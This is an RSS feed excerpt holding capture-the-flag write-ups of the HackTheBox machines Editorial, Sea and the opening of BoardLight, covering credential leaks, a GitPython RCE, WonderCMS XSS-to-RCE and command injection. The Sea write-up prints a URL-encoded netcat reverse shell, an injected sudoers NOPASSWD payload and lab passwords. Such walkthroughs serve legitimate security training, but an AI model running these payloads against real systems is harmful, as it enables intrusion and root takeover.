&lt;p&gt;We found that commit “&lt;strong&gt;b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae&lt;/strong&gt;” downgraded &lt;strong&gt;prod&lt;/strong&gt; to &lt;strong&gt;dev&lt;/strong&gt;, suggesting that &lt;strong&gt;prod&lt;/strong&gt; information is likely in the previous commit “&lt;strong&gt;1e84a036b2f33c59e2390730699a488c65643d28&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;Revert to commit “&lt;strong&gt;1e84a036b2f33c59e2390730699a488c65643d28&lt;/strong&gt;” and search for sensitive information.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git reset &lt;span class=&quot;nt&quot;&gt;--hard&lt;/span&gt; 1e84a036b2f33c59e2390730699a488c65643d28
find &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-type&lt;/span&gt; f &lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;password|passwd|pwd&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{}&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Similar to before, the file leaks credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-16.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;find result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We now have the user “&lt;strong&gt;prod&lt;/strong&gt;” and their password “&lt;strong&gt;080217_Producti0n_2023!@&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;Use these credentials to log in to the SSH service.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-17.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;get shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Login successful, we have a &lt;strong&gt;prod&lt;/strong&gt; user shell.&lt;/p&gt;

&lt;p&gt;Check &lt;strong&gt;sudo -l&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-18.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;sudo -l&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The current account is allowed to execute the script “&lt;strong&gt;/opt/internal_apps/clone_changes/clone_prod_changes.py&lt;/strong&gt;” via &lt;strong&gt;sudo&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-19.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;source code&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Here’s the source code for the &lt;strong&gt;clone_prod_changes.py&lt;/strong&gt; script.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python3
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;git&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Repo&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;chdir&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/opt/internal_apps/clone_changes&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url_to_clone&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Repo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bare&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;clone_from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url_to_clone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;new_changes&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;multi_options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-c protocol.ext.allow=always&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let’s perform a Google search based on some features in the source code.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-20.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;google search&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Google reveals an &lt;strong&gt;RCE&lt;/strong&gt; vulnerability in &lt;strong&gt;gitpython&lt;/strong&gt;:  &lt;a href=&quot;https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858&quot;&gt;CVE-2022-24439&lt;/a&gt;.&lt;br /&gt;
But be careful not to confuse this with another vulnerability.   &lt;a href=&quot;https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221&quot;&gt;CVE-2022-25912&lt;/a&gt; .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-21.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;vulnerablitiy infomation&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We modify the PoC accordingly,&lt;br /&gt;
making the &lt;strong&gt;clone_prod_changes.py&lt;/strong&gt; script’s input point to our reverse shell script.&lt;/p&gt;

&lt;p&gt;Note that the “&lt;strong&gt;%&lt;/strong&gt;” in the payload is to escape the space that follows.&lt;/p&gt;

&lt;p&gt;Then, we execute the &lt;strong&gt;clone_prod_changes.py&lt;/strong&gt; script via sudo.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-22.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;exploit&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The reverse shell gets &lt;strong&gt;root&lt;/strong&gt; privileges.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-09-03-writeup-hackthebox-editorial/image-23.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;get shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;OK! Work done :)&lt;/p&gt;
</description>
        <pubDate>Tue, 03 Sep 2024 13:57:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/09/03/writeup-hackthebox-editorial/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/09/03/writeup-hackthebox-editorial/</guid>
        
        <category>WriteUp</category>
        
        <category>Hack The Box</category>
        
        <category>OSCP like</category>
        
        
      </item>
    
      <item>
        <title>[WriteUp] HackTheBox - Sea</title>
        <description>&lt;p&gt;Sea is a simple box from HackTheBox’s Season 6 of 2024.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;As usual, the &lt;strong&gt;Nmap&lt;/strong&gt; scan shows open ports &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;80&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;We always know that SSH won’t be the first choice,&lt;br /&gt;
so let’s check out the web service first.&lt;/p&gt;

&lt;p&gt;We browse through each page of the web service but find nothing special.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-1.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The only page that stands out is “&lt;strong&gt;contact.php&lt;/strong&gt;”, which has a form.&lt;br /&gt;
Our instinct tells us that the “&lt;strong&gt;Website&lt;/strong&gt;” field might be vulnerable to &lt;strong&gt;XSS&lt;/strong&gt; or &lt;strong&gt;CSRF&lt;/strong&gt; attacks.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-2.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page: /contact.php&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We scan all possible directories, starting from the root directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-3.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan: /&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The root directory scan show four subdirectories:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;data&lt;/li&gt;
  &lt;li&gt;messages&lt;/li&gt;
  &lt;li&gt;plugins&lt;/li&gt;
  &lt;li&gt;themes&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s scan these four directories and their subdirectories.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-4.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan: /data&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-5.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan: /plugins &amp;amp; /messages&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-6.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;dirsearch scan: /themes&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Some interesting information appears under the “&lt;strong&gt;/themes/bike&lt;/strong&gt;” directory.&lt;/p&gt;

&lt;p&gt;“&lt;strong&gt;/themes/bike/summary&lt;/strong&gt;” exposes the &lt;strong&gt;theme&lt;/strong&gt; used by this CMS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-7.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page: /themes/bike/summary&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;“&lt;strong&gt;/themes/bike/version&lt;/strong&gt;” reveals the theme &lt;strong&gt;version&lt;/strong&gt; used by the CMS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-8.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page: /themes/bike/version&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;“&lt;strong&gt;/themes/bike/LICENSE&lt;/strong&gt;” exposes the CMS’s copyright information,&lt;br /&gt;
including the &lt;strong&gt;author’s name&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-9.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page: /themes/bike/LICENSE&lt;/em&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;foothold&quot;&gt;&lt;strong&gt;Foothold&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;We search for this information on GitHub and eventually identify the likely CMS through the author’s name.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-10.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;github search result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We suspect the CMS used here is “&lt;strong&gt;Wonder CMS&lt;/strong&gt;”.&lt;br /&gt;
Let’s see if there’s an exploit script available for it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-11.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;github search result&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Luckily, we find a CVE that matches the version number: &lt;a href=&quot;https://github.com/insomnia-jacob/CVE-2023-41425&quot;&gt;&lt;strong&gt;CVE-2023-41425&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;
This is an exploit script that use an &lt;strong&gt;XSS&lt;/strong&gt; vulnerability to achieve &lt;strong&gt;RCE&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;By examining the source code,&lt;br /&gt;
we infer that there might be a link like “&lt;strong&gt;/index.php?page=loginURL&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-12.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;exploit source code&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Let’s visit this link.&lt;/p&gt;

&lt;p&gt;Yes! It exists, confirming our suspicion that the web service indeed uses “&lt;strong&gt;Wonder CMS&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-13.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page: /index.php?page=loginURL&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;So, download and execute the exploit script.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;python3 exploit.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://sea.htb/loginURL &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &amp;lt;your_ip&amp;gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &amp;lt;your_port&amp;gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; http://&amp;lt;your_ip&amp;gt;:8000/main.zip&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-14.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;run exploit script&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Enter the link provided by “&lt;strong&gt;Send the below link to admin&lt;/strong&gt;” in the suspected location.&lt;/p&gt;

&lt;p&gt;Like this.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Submit the form and wait a moment.&lt;/p&gt;

&lt;p&gt;Yes! It worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-16.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;www-data shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We obtained a “&lt;strong&gt;www-data&lt;/strong&gt;” user shell.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;As we know, the “&lt;strong&gt;www-data&lt;/strong&gt;” user has very limited permissions.&lt;br /&gt;
We need to escalate privileges.&lt;/p&gt;

&lt;p&gt;Let’s explore the web file directory “&lt;strong&gt;/var/www/&lt;/strong&gt;” to look for sensitive information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-17.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;check web files&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The file “&lt;strong&gt;/var/www/data/database.js&lt;/strong&gt;” caught my attention.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-18.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;check database.js&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Do you see the “&lt;strong&gt;password&lt;/strong&gt;” hash? That might be the breakthrough.&lt;/p&gt;

&lt;p&gt;Copy the hash locally and use “&lt;strong&gt;John&lt;/strong&gt;” to brute-force it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-19.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;crack password hash&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We got a password!&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;mychemicalromance&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Check which users are allowed to log in.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-20.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;check passwd file&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Besides the root user, “&lt;strong&gt;amay&lt;/strong&gt;” or “&lt;strong&gt;geo&lt;/strong&gt;” might be able to login.&lt;/p&gt;

&lt;p&gt;Try login by “&lt;strong&gt;amay&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-21.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;user shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;We obtain a shell with user privileges!&lt;/p&gt;

&lt;p&gt;Next, we need to escalate to root.&lt;/p&gt;

&lt;p&gt;Let’s check &lt;strong&gt;sudo&lt;/strong&gt; first.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-22.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;check sudo&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The current user amay cannot use the sudo command.&lt;/p&gt;

&lt;p&gt;Upload &lt;strong&gt;linpeas.sh&lt;/strong&gt; for a comprehensive enumeration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-23.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;SUID/SGID files&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Cross-reference the &lt;strong&gt;SUID/SGID&lt;/strong&gt; information with &lt;strong&gt;GTFObin&lt;/strong&gt;,&lt;br /&gt;
but nothing useful turns up for now.&lt;/p&gt;

&lt;p&gt;But the open ports reveal something interesting,&lt;br /&gt;
including ports &lt;strong&gt;8080&lt;/strong&gt; and &lt;strong&gt;37309&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-24.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;active ports&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Check out port &lt;strong&gt;8080&lt;/strong&gt;, it’s also a web service.&lt;br /&gt;
It requires authentication, we can reuse &lt;strong&gt;amay&lt;/strong&gt;’s username and password.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-25.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;other web&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;To make it easier to inspect through the browser,&lt;br /&gt;
we forward port 8080 on the remote machine to port 8080 on our local machine.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;ssh &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 8080:localhost:8080 amay@sea.htb&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Then access it via the browser, it’s a system monitoring panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-26.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;other web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The “&lt;strong&gt;Analyze Log File&lt;/strong&gt;” feature allows access to log files with root permissions.&lt;/p&gt;

&lt;p&gt;After some testing,&lt;br /&gt;
we find that modifying the “&lt;strong&gt;log_file&lt;/strong&gt;” parameter enables arbitrary file reading.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-27.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;test log_file&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-28.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;result of test log_file&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Further testing the “&lt;strong&gt;log_file&lt;/strong&gt;” parameter with &lt;strong&gt;BurpSuite&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-29.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;test sep&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The parameter value can’t end with a “&lt;strong&gt;;&lt;/strong&gt;” symbol.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-30.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;test sep&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;But it can end with “&lt;strong&gt;+#&lt;/strong&gt;” (where “+” is URL-encoded as a space).&lt;/p&gt;

&lt;p&gt;Test modifying the parameter value to point to two different file paths.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/passwd+/etc/hosts+#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It still works, leading us to suspect that the web application might be using a tool like “cat” to read files.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-31.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;test double file&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Test again,&lt;br /&gt;
modifying the parameter value to include a command injection.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/passwd+%26%26+id+#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-32.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;test command inject&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The command injection was successful.&lt;/p&gt;

&lt;p&gt;OK, let’s modify the payload to execute a reverse shell.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/passwd+%26%26+rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.16.5%2014444%20%3E%2Ftmp%2Ff%3Bsleep+60+#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-33.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;try get shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;It worked, but the connection dropped shortly after.&lt;/p&gt;

&lt;p&gt;We might need another method to gain a persistent root session.&lt;br /&gt;
I have a new idea: “&lt;strong&gt;Give amay sudo privileges&lt;/strong&gt;”.&lt;/p&gt;

&lt;p&gt;Update the payload to modify the &lt;strong&gt;sudoers&lt;/strong&gt; file.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;/etc/passwd+%26%26+echo+&lt;span class=&quot;s2&quot;&gt;&quot;amay+ALL=(ALL)+NOPASSWD:+ALL&quot;&lt;/span&gt;+&amp;gt;+/etc/sudoers.d/amay+#&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-34.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;try edit sudoer&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The amay user executes the sudo command, it worked!&lt;/p&gt;

&lt;p&gt;This is the final step: we obtain a root shell through the sudo command!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-26-writeup-hackthebox-sea/image-35.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;root shell&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;:)&lt;/p&gt;

</description>
        <pubDate>Mon, 26 Aug 2024 15:21:00 +0800</pubDate>
        <link>https://b0rgch3n.github.io/2024/08/26/writeup-hackthebox-sea/</link>
        <guid isPermaLink="true">https://b0rgch3n.github.io/2024/08/26/writeup-hackthebox-sea/</guid>
        
        <category>WriteUp</category>
        
        <category>Hack The Box</category>
        
        
      </item>
    
      <item>
        <title>[WriteUp] HackTheBox - BoardLight</title>
        <description>&lt;p&gt;BoardLight is a simple difficulty box on HackTheBox.&lt;br /&gt;
It is also the &lt;strong&gt;OSCP like&lt;/strong&gt; box in the &lt;a href=&quot;https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#&quot;&gt;NetSecFocus Trophy Room list by TJ Null&lt;/a&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;enumeration&quot;&gt;&lt;strong&gt;Enumeration&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;As always, let’s start with enumeration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-1.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;Nmap scan&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The familiar &lt;strong&gt;Nmap&lt;/strong&gt; scan report shows open ports 22 and 80.&lt;/p&gt;

&lt;p&gt;Port 80 is for the web service, which redirects to the domain “&lt;strong&gt;board.htb&lt;/strong&gt;”,&lt;br /&gt;
so we need to configure the hosts file first.&lt;/p&gt;

&lt;p&gt;Checked every page, but found no special information.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/2024-08-02-writeup-hackthebox-boardlight/image-2.png&quot; alt=&quot;&quot; /&gt;
  &lt;em&gt;web page&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Attempted to enumerate subdomains using &lt;strong&gt;ffuf&lt;/strong&gt;.&lt;/p&gt;

